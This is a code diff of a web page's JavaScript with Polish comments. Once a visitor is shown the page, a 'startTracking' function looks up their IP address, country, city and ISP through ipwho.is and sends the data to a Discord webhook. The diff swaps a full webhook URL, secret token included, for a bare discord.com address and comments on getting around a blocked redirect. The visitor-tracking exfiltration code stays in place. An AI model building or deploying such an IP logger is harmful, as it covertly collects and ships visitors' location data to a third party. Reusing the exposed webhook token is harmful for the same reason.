@@ -167,8 +167,8 @@
     </div>
 
     <script>
-        // ZAKTUALIZOWANY ADRES WEBHOOKA (ZMIANA NA DISCORD.COM)
-        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1532069719056715866/1cAY66JZ6NA6sh-FNeT5sEAKDt_3aZKoQHNBSuHCJEM3Z9dtw9s77EpjwgfNX0JydsgA";
+        // TWÓJ WEBHOOK SKIEROWANY BEZPOŚREDNIO NA STRONĘ DISCORD.COM (BEZ BLOKOWANEGO PRZEKIEROWANIA AP_P)
+        const DISCORD_WEBHOOK_URL = "https://discord.com";
 
         window.onload = function() {
             var consent = localStorage.getItem('siteConsent');
@@ -207,12 +207,11 @@
         function startTracking() {
             document.getElementById('mainPage').style.display = 'block';
             
-            // Pobieranie IP i lokalizacji jednym zapytaniem bez błędów CORS
+            // Bezpieczne pobieranie geolokalizacji bez błędów sieciowych CORS
             fetch('https://ipwho.is')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
                     if(data && data.success) {
-                        // Mapowanie odpowiedzi ipwho.is do formatu oczekiwanego przez wysyłkę
                         const locData = {
                             ip: data.ip,
                             country_name: data.country,
@@ -222,7 +221,7 @@
                         };
                         sendToDiscord(locData);
                     } else {
-                        sendToDiscord({ ip: "Błąd API lokalizacji", country_name: "-", city: "-", region: "-", org: "-" });
+                        sendToDiscord({ ip: "Blad API lokalizacji", country_name: "-", city: "-", region: "-", org: "-" });
                     }
                 })
                 .catch(function(error) {
